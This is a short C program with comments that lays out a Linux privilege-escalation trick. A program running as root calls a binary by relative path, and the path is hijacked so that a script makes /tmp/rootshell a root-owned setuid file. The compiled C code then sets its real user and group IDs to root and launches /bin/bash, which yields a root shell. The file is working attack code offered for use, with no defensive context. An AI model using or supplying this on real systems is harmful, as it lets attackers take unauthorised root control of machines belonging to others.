// When a program gets executed with root privileges and relative path, compile
// this program and replace the path so that this script gets executed:
// #!/bin/sh
// chown root:root /tmp/rootshell
// chmod 777 /tmp/rootshell
// chmod +s /tmp/rootshell

#include <unistd.h>

int main() {
    setreuid(geteuid(),geteuid());
    setregid(geteuid(),geteuid());
    execv("/bin/bash",0);
}
